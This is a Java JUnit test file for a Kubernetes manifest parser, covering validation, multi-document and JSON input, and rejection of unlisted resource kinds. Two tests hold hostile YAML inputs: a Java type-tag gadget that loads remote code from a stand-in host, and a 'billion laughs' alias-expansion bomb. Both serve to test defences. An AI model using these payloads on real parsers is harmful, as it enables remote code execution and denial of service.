package com.orchpilot.workflow.plugins.gcp.kubernetes;

import com.orchpilot.workflow.plugins.gcp.kubernetes.manifest.ManifestParser;
import com.orchpilot.workflow.plugins.gcp.kubernetes.model.K8sResource;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Manifest parsing and validation, including the cases that make YAML dangerous.
 *
 * <p>The security tests here matter more than the happy path: a manifest can arrive from an AI Agent or a form
 * field, so a parser that instantiates arbitrary classes or expands anchors without limit would be a hole in the
 * plugin, not an inconvenience.
 */
class ManifestParserTest {

    @Test
    void parsesAValidDeployment() {
        String manifest = """
                apiVersion: apps/v1
                kind: Deployment
                metadata:
                  name: web
                spec:
                  replicas: 2
                """;

        ManifestParser.Validation validation = ManifestParser.validate(manifest, "prod");

        assertThat(validation.valid()).isTrue();
        assertThat(validation.documents()).hasSize(1);
        ManifestParser.Document document = validation.documents().get(0);
        assertThat(document.resource()).isEqualTo(K8sResource.DEPLOYMENT);
        assertThat(document.name()).isEqualTo("web");
        // The default namespace is applied and written back, so what is applied is what was validated.
        assertThat(document.namespace()).isEqualTo("prod");
        assertThat(document.body()).extracting("metadata")
                .asInstanceOf(org.assertj.core.api.InstanceOfAssertFactories.MAP)
                .containsEntry("namespace", "prod");
    }

    @Test
    void parsesMultipleDocuments() {
        String manifest = """
                apiVersion: v1
                kind: Service
                metadata:
                  name: web-svc
                ---
                apiVersion: apps/v1
                kind: Deployment
                metadata:
                  name: web
                """;

        ManifestParser.Validation validation = ManifestParser.validate(manifest, "default");

        assertThat(validation.valid()).isTrue();
        assertThat(validation.documents()).hasSize(2);
        assertThat(validation.documents()).extracting(document -> document.resource().kind())
                .containsExactly("Service", "Deployment");
    }

    @Test
    void acceptsJsonBecauseJsonIsYaml() {
        String manifest = "{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"cfg\"}}";

        ManifestParser.Validation validation = ManifestParser.validate(manifest, "default");

        assertThat(validation.valid()).isTrue();
        assertThat(validation.documents().get(0).resource()).isEqualTo(K8sResource.CONFIGMAP);
    }

    @Test
    void rejectsMismatchedApiVersion() {
        String manifest = """
                apiVersion: v1
                kind: Deployment
                metadata:
                  name: web
                """;

        ManifestParser.Validation validation = ManifestParser.validate(manifest, "default");

        assertThat(validation.valid()).isFalse();
        assertThat(validation.problems()).anyMatch(problem -> problem.contains("apiVersion 'v1'"));
    }

    @Test
    void rejectsAnUnknownKindRatherThanForwardingIt() {
        String manifest = """
                apiVersion: rbac.authorization.k8s.io/v1
                kind: ClusterRoleBinding
                metadata:
                  name: escalate
                """;

        ManifestParser.Validation validation = ManifestParser.validate(manifest, "default");

        // Refusing an unlisted kind is what stops the plugin being a generic conduit to the cluster API.
        assertThat(validation.valid()).isFalse();
        assertThat(validation.problems()).anyMatch(problem -> problem.contains("ClusterRoleBinding"));
    }

    @Test
    void rejectsAMissingName() {
        ManifestParser.Validation validation = ManifestParser.validate("""
                apiVersion: v1
                kind: Service
                metadata:
                  labels:
                    app: web
                """, "default");

        assertThat(validation.valid()).isFalse();
        assertThat(validation.problems()).anyMatch(problem -> problem.contains("metadata.name"));
    }

    @Test
    void refusesJavaTypeTagsInsteadOfInstantiatingThem() {
        // The classic YAML remote-code-execution shape. SafeConstructor must reject it, not construct it.
        String manifest = """
                apiVersion: v1
                kind: ConfigMap
                metadata:
                  name: !!javax.script.ScriptEngineManager [!!java.net.URL ["http://evil.example/x"]]
                """;

        ManifestParser.Validation validation = ManifestParser.validate(manifest, "default");

        assertThat(validation.valid()).isFalse();
        assertThat(validation.problems()).anyMatch(problem -> problem.contains("could not be parsed"));
    }

    @Test
    void refusesAliasExpansion() {
        // "Billion laughs": a few hundred bytes that expands to gigabytes if aliases are allowed.
        String manifest = """
                apiVersion: v1
                kind: ConfigMap
                metadata:
                  name: bomb
                data:
                  a: &a ["x","x","x","x","x","x","x","x","x"]
                  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
                  c: [*b,*b,*b,*b,*b,*b,*b,*b,*b]
                """;

        ManifestParser.Validation validation = ManifestParser.validate(manifest, "default");

        assertThat(validation.valid()).isFalse();
    }

    @Test
    void rejectsDuplicateKeys() {
        ManifestParser.Validation validation = ManifestParser.validate("""
                apiVersion: v1
                kind: ConfigMap
                metadata:
                  name: first
                  name: second
                """, "default");

        assertThat(validation.valid()).isFalse();
    }

    @Test
    void rejectsAnEmptyManifest() {
        assertThat(ManifestParser.validate("", "default").valid()).isFalse();
        assertThat(ManifestParser.validate("   ", "default").problems()).isNotEmpty();
    }

    @Test
    void doesNotAddANamespaceToClusterScopedResources() {
        ManifestParser.Validation validation = ManifestParser.validate("""
                apiVersion: v1
                kind: Namespace
                metadata:
                  name: staging
                """, "prod");

        assertThat(validation.valid()).isTrue();
        assertThat(validation.documents().get(0).namespace()).isNull();
    }

    @Test
    void normalisesNonStringKeysSoTheJsonWriterAccepts() {
        // YAML lets "8080:" parse as an Integer key; the API wants strings.
        ManifestParser.Validation validation = ManifestParser.validate("""
                apiVersion: v1
                kind: ConfigMap
                metadata:
                  name: ports
                data:
                  8080: http
                """, "default");

        assertThat(validation.valid()).isTrue();
        assertThat(ManifestParser.toJson(validation.documents().get(0).body())).contains("\"8080\"");
    }
}
